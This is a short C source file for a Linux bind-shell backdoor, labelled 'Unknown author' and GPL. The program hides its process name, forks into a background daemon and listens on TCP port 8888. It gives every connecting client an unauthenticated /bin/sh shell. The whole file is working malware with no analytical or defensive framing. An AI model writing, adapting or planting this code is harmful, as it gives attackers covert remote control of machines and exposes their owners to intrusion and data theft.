/*
 *bindshell for linux
 *
 *Unknown author
 *
 *Date:2016.9.9
 *
 *GPL
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>

#define PORT 8888

int sock_fd, sock_cli, sock_rc, sock_len, server_pid, cli_pid;
struct sockaddr_in server_addr;
struct sockaddr_in client_addr;

int main(int argc, char* argv[])
{
    int i;
    for(i = 0; i<argc; ++i)
    {
        memset(argv[i], '\x0', strlen(argv[i]));
    }
    strcpy(argv[0], "th1s iz mY 3l1t3 baCkd00r");

    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock_fd == -1)
    {
        exit(-1);
    }
    bzero((char*)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    sock_rc = bind(sock_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if(sock_rc)
    {
        exit(-1);
    }
    if(fork())
    {
        exit(0);
    }
    setpgrp();
    signal(SIGHUP, SIG_IGN);
    if(fork())
    {
        exit(0);
    }
    sock_rc = listen(sock_fd, 10);
    if(sock_rc)
    {
        exit(0);
    }
    while(1)
    {
        sock_len = sizeof(client_addr);
        sock_cli = accept(sock_fd, (struct sockaddr*)&client_addr, &sock_len);
        if(sock_cli < 0)
        {
            exit(0);
        }
        cli_pid = getpid();
        server_pid = fork();
        if(server_pid != 0)
        {
            dup2(sock_cli, 0);
            dup2(sock_cli, 1);
            dup2(sock_cli, 2);
            execl("/bin/sh", "sh", (char*)0);
            close(sock_cli);
            exit(0);
        }
        close(sock_cli);
    }
}
